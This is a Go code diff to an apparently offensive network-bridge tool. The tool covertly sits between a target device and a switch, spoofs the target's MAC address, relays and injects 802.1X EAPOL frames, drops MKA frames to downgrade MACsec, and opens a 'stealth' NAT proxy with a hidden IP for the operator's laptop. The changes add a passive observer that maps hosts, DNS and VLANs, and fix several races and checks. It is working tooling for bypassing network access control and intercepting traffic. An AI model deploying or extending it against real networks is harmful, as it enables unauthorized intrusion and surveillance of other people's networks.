@@ -83,6 +83,10 @@ type Bridge struct {
 	macsecDowngrade bool          // If true, drop MKA frames during relay (default: true)
 	continueCh      chan struct{} // Unblocks bridge goroutine when user presses Continue
 
+	// NAT proxy state
+	natHiddenIP  string // The orthogonal IP assigned to bridge0 for NAT (empty = no NAT)
+	isNATActive  bool   // Whether NAT proxy is currently enabled
+
 	// 802.1X EAPOL relay state
 	eapolRelay   *eapol.Relay
 	eapolSession *eapol.AuthSession
@@ -149,7 +153,6 @@ func NewBridge(ifaceA, ifaceB string, ignoreMAC string) (*Bridge, error) {
 	_, _ = runCmd("sysctl", "-w", "net.inet6.ip6.forwarding=0")
 
 	// We DELAY bridging them until the MAC is explicitly spoofed!
-	b.state = BridgeStateCreated
 
 	// Kick off stealth NAT setup if requested.
 	// Hardcoded to true for now as per user request to use strat 1.
@@ -185,7 +188,9 @@ func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 		b.mu.Unlock()
 
 		logFunc(fmt.Sprintf("[*] Activating bridge using spoofed Target MAC %s", mac.String()))
-		runCmd("ifconfig", b.name, "ether", mac.String())
+		if _, err := runCmd("ifconfig", b.name, "ether", mac.String()); err != nil {
+			logFunc(fmt.Sprintf("[!] Bridge MAC spoof failed: %v — bridge may leak factory MAC", err))
+		}
 
 		logFunc(fmt.Sprintf("[*] Hard-spoofing Switch adapter factory MAC to %s", mac.String()))
 		out, err := runCmd("ifconfig", b.ifaceB, "ether", mac.String())
@@ -278,6 +283,11 @@ func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 	if !id.HasGateway() {
 		go b.sniffGateway(ctx, ignoreMAC, logFunc)
 	}
+
+	// Start the continuous network observer on the bridge interface.
+	// This passively maps all traffic flowing through the bridge — hosts, DNS,
+	// VLANs — without generating any packets. Runs until bridge is destroyed.
+	go b.runNetworkObserver(ctx, logFunc)
 }
 
 // sniffGateway continues passively sniffing for gateway information after
@@ -290,9 +300,7 @@ func (b *Bridge) sniffGateway(ctx context.Context, ignoreMAC string, logFunc fun
 	// a fresh sniffer that keeps watching for DHCP ACKs and ARP from the gateway.
 	// We re-use the same interface and look for gateway info in a separate Discover call.
 	// Since onMacFunc already ran, it won't be called again (MAC is already known).
-	noopMac := func(mac net.HardwareAddr) {}
-
-	gwID, err := sniff.DiscoverGateway(ctx, ignoreMAC, logFunc, noopMac)
+	gwID, err := sniff.DiscoverGateway(ctx, ignoreMAC, logFunc)
 	if err != nil {
 		return
 	}
@@ -307,6 +315,35 @@ func (b *Bridge) sniffGateway(ctx context.Context, ignoreMAC string, logFunc fun
 		logFunc("[+] Gateway discovered: " + gwID.Gateway.String())
 		logFunc("[+] NAT proxy now available.")
 	}
+}
+
+// runNetworkObserver starts the passive network observer on the bridge interface.
+// It continuously maps all traffic flowing through the bridge — hosts, DNS queries,
+// VLANs — without generating any packets. Runs until context is cancelled.
+func (b *Bridge) runNetworkObserver(ctx context.Context, logFunc func(string)) {
+	b.mu.Lock()
+	bridgeName := b.name
+	var targetMAC net.HardwareAddr
+	if b.targetID != nil && len(b.targetID.MAC) > 0 {
+		targetMAC = make(net.HardwareAddr, len(b.targetID.MAC))
+		copy(targetMAC, b.targetID.MAC)
+	}
+	b.mu.Unlock()
+
+	if targetMAC == nil {
+		logFunc("[!][RECON] Cannot start observer: no target MAC.")
+		return
+	}
+
+	observer := stealth.NewObserver(bridgeName)
+	netMap := observer.Run(ctx, targetMAC, logFunc)
+
+	// Store the network map for the TUI to access.
+	b.mu.Lock()
+	if b.targetID != nil {
+		b.targetID.NetworkMap = netMap
+	}
+	b.mu.Unlock()
 }
 
 // Continue unblocks the bridge goroutine when it's paused on a failure.
@@ -343,6 +380,65 @@ func (b *Bridge) MACsecDowngrade() bool {
 	b.mu.Lock()
 	defer b.mu.Unlock()
 	return b.macsecDowngrade
+}
+
+// IsNATActive returns whether NAT proxy is currently enabled on the bridge.
+func (b *Bridge) IsNATActive() bool {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+	return b.isNATActive
+}
+
+// DisableNATProxy removes the NAT proxy, restoring the bridge to L2-only passthrough.
+// This flushes pfctl rules and removes the hidden IP from bridge0. The target device's
+// traffic continues flowing through the bridge unaffected — only the operator's
+// MacBook loses network access.
+func (b *Bridge) DisableNATProxy(logFunc func(string)) error {
+	b.mu.Lock()
+	hiddenIP := b.natHiddenIP
+	bridgeName := b.name
+	wasActive := b.isNATActive
+	b.mu.Unlock()
+
+	if !wasActive {
+		logFunc("[*] NAT proxy is not active — nothing to disable.")
+		return nil
+	}
+
+	logFunc("[*] Disabling NAT proxy...")
+
+	// 1. Flush pfctl rules.
+	if err := stealth.DisableNAT(); err != nil {
+		logFunc(fmt.Sprintf("[!] Failed to flush pfctl rules: %v", err))
+		return err
+	}
+	logFunc("[+] pfctl rules flushed.")
+
+	// 2. Remove the hidden IP from the bridge interface.
+	if hiddenIP != "" {
+		if _, err := runCmd("ifconfig", bridgeName, "delete", hiddenIP); err != nil {
+			logFunc(fmt.Sprintf("[!] Failed to remove hidden IP %s: %v", hiddenIP, err))
+			// Non-fatal — continue anyway.
+		} else {
+			logFunc(fmt.Sprintf("[+] Removed hidden IP %s from %s.", hiddenIP, bridgeName))
+		}
+	}
+
+	b.mu.Lock()
+	b.isNATActive = false
+	b.natHiddenIP = ""
+
+	// Transition state back to Ready (for re-enabling) or keep auth state if 802.1X.
+	if b.state == BridgeStateStealthActive {
+		b.state = BridgeStateReady
+	}
+	b.mu.Unlock()
+
+	logFunc("[+] NAT proxy disabled. Bridge is in L2-only passthrough mode.")
+	logFunc("[*] Operator has no network access. Target device is unaffected.")
+	logFunc("[*] Press [N] to re-enable NAT proxy, or [A] for full auto mode.")
+
+	return nil
 }
 
 // EAPOLDetected returns whether the sniffer detected 802.1X during recon.
@@ -465,7 +561,11 @@ func (b *Bridge) RunEAPOLRelay(logFunc func(string)) {
 // RunNATProxy sets up the stealth NAT proxy (skips 802.1X).
 func (b *Bridge) RunNATProxy(logFunc func(string)) {
 	b.mu.Lock()
-	id := b.targetID
+	var id *stealth.TargetIdentity
+	if b.targetID != nil {
+		copy := *b.targetID // Deep copy to prevent data race with sniffGateway
+		id = &copy
+	}
 	b.mu.Unlock()
 
 	if id == nil {
@@ -481,27 +581,39 @@ func (b *Bridge) RunNATProxy(logFunc func(string)) {
 // the device needs to initiate 802.1X authentication from its side.
 func (b *Bridge) RunInjectEAPOL(logFunc func(string)) {
 	b.mu.Lock()
-	mac := b.targetID
+	var supplicantMAC net.HardwareAddr
+	if b.targetID != nil {
+		supplicantMAC = make(net.HardwareAddr, len(b.targetID.MAC))
+		copy(supplicantMAC, b.targetID.MAC) // Deep copy MAC to prevent data race
+	}
+	alreadyListening := b.isListening
 	b.mu.Unlock()
 
-	if mac == nil {
+	if supplicantMAC == nil {
 		logFunc("[!][802.1X] Cannot inject EAPOL: no target identity.")
 		return
 	}
 
 	logFunc("[802.1X] Injecting EAPOL-Start on switch port to trigger authenticator...")
-	if err := eapol.InjectEAPOLStart(b.ifaceB, mac.MAC, logFunc); err != nil {
+	if err := eapol.InjectEAPOLStart(b.ifaceB, supplicantMAC, logFunc); err != nil {
 		logFunc(fmt.Sprintf("[!][802.1X] EAPOL-Start injection failed: %v", err))
 	} else {
 		logFunc("[+][802.1X] EAPOL-Start injected. Listening for switch response...")
-		// After injection, start passive listening to see if the switch responds.
-		go b.RunListenEAPOL(logFunc)
+		// After injection, start passive listening only if not already listening.
+		if !alreadyListening {
+			go b.RunListenEAPOL(logFunc)
+		}
 	}
 }
 
 // runEAPOLRelay manages the 802.1X EAPOL relay lifecycle.
 func (b *Bridge) runEAPOLRelay(ctx context.Context, logFunc func(string)) {
 	b.mu.Lock()
+	if b.targetID == nil {
+		b.mu.Unlock()
+		logFunc("[!][802.1X] Cannot start relay: no target identity.")
+		return
+	}
 	session := eapol.NewAuthSession(b.targetID.MAC)
 	b.eapolSession = session
 	b.state = BridgeStateEAPOLRelaying
@@ -607,7 +719,7 @@ func (b *Bridge) setupNATProxy(id *stealth.TargetIdentity, logFunc func(string))
 		hiddenIP = "10.254.254.10"
 	} else if strings.HasPrefix(targetStr, "10.") {
 		hiddenIP = "172.16.254.10"
-	} else if strings.HasPrefix(targetStr, "172.") {
+	} else if isRFC1918_172(targetStr) {
 		hiddenIP = "192.168.254.10"
 	}
 
@@ -628,6 +740,8 @@ func (b *Bridge) setupNATProxy(id *stealth.TargetIdentity, logFunc func(string))
 	}
 
 	b.mu.Lock()
+	b.natHiddenIP = hiddenIP
+	b.isNATActive = true
 	b.state = BridgeStateStealthActive
 	b.mu.Unlock()
 
@@ -646,18 +760,32 @@ func (b *Bridge) setupNATProxy(id *stealth.TargetIdentity, logFunc func(string))
 // This catches switches with long MAB fallback timers that send EAPOL-Request/Identity
 // after our initial detection timeout expired.
 func (b *Bridge) backgroundEAPOLWatch(logFunc func(string)) {
-	// Create a cancellable context tied to the bridge's lifecycle.
-	// When the bridge is destroyed, cancelStealth fires, which cancels this too.
+	// Create a cancellable context derived from the stealth context so it
+	// cancels automatically when the bridge is destroyed.
+	b.mu.Lock()
+	parentCancel := b.cancelStealth
+	b.mu.Unlock()
+
+	// Build a context that we can cancel independently, AND that dies
+	// when destroy() fires cancelStealth.
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Store the cancel so destroy() can stop the background watcher.
+	// Chain into cancelEAPOL so Destroy() can stop us.
 	b.mu.Lock()
 	origCancel := b.cancelEAPOL
 	b.cancelEAPOL = func() {
 		cancel()
 		if origCancel != nil {
 			origCancel()
+		}
+	}
+	// Also ensure the parent stealth cancel kills us too.
+	if parentCancel != nil {
+		oldStealth := parentCancel
+		b.cancelStealth = func() {
+			cancel() // Also cancel the background EAPOL watcher
+			oldStealth()
 		}
 	}
 	b.mu.Unlock()
@@ -848,4 +976,15 @@ func sysctl(key string) (string, error) {
 		return strings.TrimSpace(parts[1]), nil
 	}
 	return strings.TrimSpace(out), nil
+}
+
+// isRFC1918_172 returns true if the IP string is in the 172.16.0.0/12 range.
+// This correctly excludes public 172.0-15.x.x and 172.32+.x.x addresses.
+func isRFC1918_172(ipStr string) bool {
+	ip := net.ParseIP(ipStr)
+	if ip == nil {
+		return false
+	}
+	_, cidr, _ := net.ParseCIDR("172.16.0.0/12")
+	return cidr != nil && cidr.Contains(ip)
 }
